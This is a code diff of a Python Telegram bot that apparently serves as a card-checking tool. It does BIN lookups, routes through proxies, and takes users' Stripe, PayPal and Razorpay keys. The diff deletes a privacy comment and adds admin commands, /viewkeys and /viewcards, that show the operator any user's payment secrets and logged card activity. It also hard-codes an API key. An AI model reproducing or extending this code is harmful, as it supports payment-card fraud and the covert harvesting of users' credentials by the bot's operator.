@@ -20,13 +20,11 @@ ADMIN_USER_ID = int(os.getenv("ADMIN_USER_ID", "729412805"))
 BINCODES_API_KEY = os.getenv("BINCODES_API_KEY","425be7cdecc63d7a92ebe8e9bc6773a0")
 BOT_VERSION = "3.0"
 
-# Store user data separately for privacy
 user_api_keys = {}
 user_proxies = {}
 user_sites = {}
 user_activity_log = []
 
-# Default proxies and sites which user can extend
 DEFAULT_PROXIES = [
     "103.152.112.162:80",
     "190.61.41.106:999",
@@ -177,7 +175,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    # Implement your callback button logic here...
+    # Further callback handling logic here...
 
 async def setstripekey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -391,6 +389,42 @@ async def bin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text(msg)
     except Exception as e:
         await update.message.reply_text(f"Error fetching BIN info: {str(e)}")
+
+async def viewkeys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_user.id):
+        await update.message.reply_text("Unauthorized.")
+        return
+    if not context.args:
+        await update.message.reply_text("Usage:\n/viewkeys <user_id>")
+        return
+    target_id = int(context.args[0])
+    keys = get_user_keys(target_id)
+    msg = (
+        f"*User {target_id} Keys*\n"
+        f"Stripe: `{keys.get('stripe', 'Not set')}`\n"
+        f"PayPal ID: `{keys.get('paypal_id', 'Not set')}`\n"
+        f"PayPal Secret: `{keys.get('paypal_secret', 'Not set')}`\n"
+        f"Razorpay ID: `{keys.get('razorpay_id', 'Not set')}`\n"
+        f"Razorpay Secret: `{keys.get('razorpay_secret', 'Not set')}`\n"
+    )
+    await update.message.reply_text(msg, parse_mode="Markdown")
+
+async def viewcards_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not is_admin(update.effective_user.id):
+        await update.message.reply_text("Unauthorized.")
+        return
+    if not context.args:
+        await update.message.reply_text("Usage:\n/viewcards <user_id>")
+        return
+    target_id = int(context.args[0])
+    logs = [l for l in user_activity_log if l["user_id"] == target_id and 'card' in l["action"].lower()]
+    if not logs:
+        await update.message.reply_text(f"No card activity for user {target_id}.")
+        return
+    msg = f"*Card Activity for User {target_id}:*\n"
+    for log in logs[-20:]:
+        msg += f"{log['timestamp']} - {log['action']}\n"
+    await update.message.reply_text(msg, parse_mode="Markdown")
 
 def register_handlers(app):
     app.add_handler(CommandHandler("start", start))
